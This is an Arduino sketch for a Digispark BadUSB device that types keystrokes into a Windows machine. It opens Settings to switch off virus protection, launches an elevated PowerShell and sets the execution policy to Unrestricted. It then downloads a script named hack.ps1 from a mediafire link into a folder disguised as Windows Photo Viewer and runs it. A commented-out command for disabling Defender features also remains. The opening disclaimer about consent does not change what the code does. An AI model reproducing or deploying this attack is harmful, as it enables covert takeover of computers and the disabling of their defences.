//I don't condone any hacking that may be caused due 
//to the publication of this script. I am not responsible
//for any damages this may cause. Use at your own risk, 
//and only on systems that you have explicit consent to hack
//or your own systems. 

//You might want to channge the delay times as well, depending on if your target is running slower hardware. w

#include "DigiKeyboard.h"
void setup() {
}
void loop() { 
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_I, MOD_GUI_LEFT);
  DigiKeyboard.delay(1500);
  DigiKeyboard.print(F("Virus"));
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_DOWN_ARROW);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000);
  DigiKeyboard.write('\t');
  DigiKeyboard.delay(300);
  DigiKeyboard.write('\t');
  DigiKeyboard.delay(300);
  DigiKeyboard.write('\t');
  DigiKeyboard.delay(300);
  DigiKeyboard.write('\t');
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(750);
  DigiKeyboard.sendKeyStroke(KEY_SPACE);
  DigiKeyboard.delay(1500);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
  DigiKeyboard.delay(500);

  //In my usage I couldn't get alt+f4 to work with the settings window, 
  //so I chose to minimise it instead. Here's the old code anyways.
//  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_M, MOD_GUI_LEFT); 
  DigiKeyboard.delay(1000);
    


  //payload time
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); 
  DigiKeyboard.delay(500);
  DigiKeyboard.print(F("powershell"));
  DigiKeyboard.delay(250);

  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT + MOD_SHIFT_LEFT);
  DigiKeyboard.delay(1500);

  //
  
//  DigiKeyboard.sendKeyStroke(KEY_ENTER);
//  DigiKeyboard.delay(1000);
//  DigiKeyboard.print("Start-Process powershell -Verb runAs; exit");
//  DigiKeyboard.delay(1000);
//  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  // ^^ instead of this bad code above, I changed it to ctrl+sahift+enter ^^

  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
  DigiKeyboard.delay(750);

  //the line below is outdated, it used to disable windows defender, but does nothing. 
//  DigiKeyboard.print(F("Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend"));
//  DigiKeyboard.delay(500);
//  DigiKeyboard.sendKeyStroke(KEY_ENTER);
//  DigiKeyboard.delay(500);

  //Downloading the payload over the network to 
  //"C:/Program Files/Windows Photo Viewer" and launching it
  DigiKeyboard.print(F("Set-ExecutionPolicy Unrestricted ; mkdir 'C:/Program Files/Windows Photo Viewer/' ; cd 'C:/Program Files/Windows Photo Viewer/' ; powershell -command '& { iwr https://download948.mediafire.com/unjmavzj8m7g/yxij54bvlbzetjm/hack.ps1 -OutFile bgpl.ps1 }'; ./bgpl.ps1"));
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("a"); //verification
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  
  for(;;){ }

}
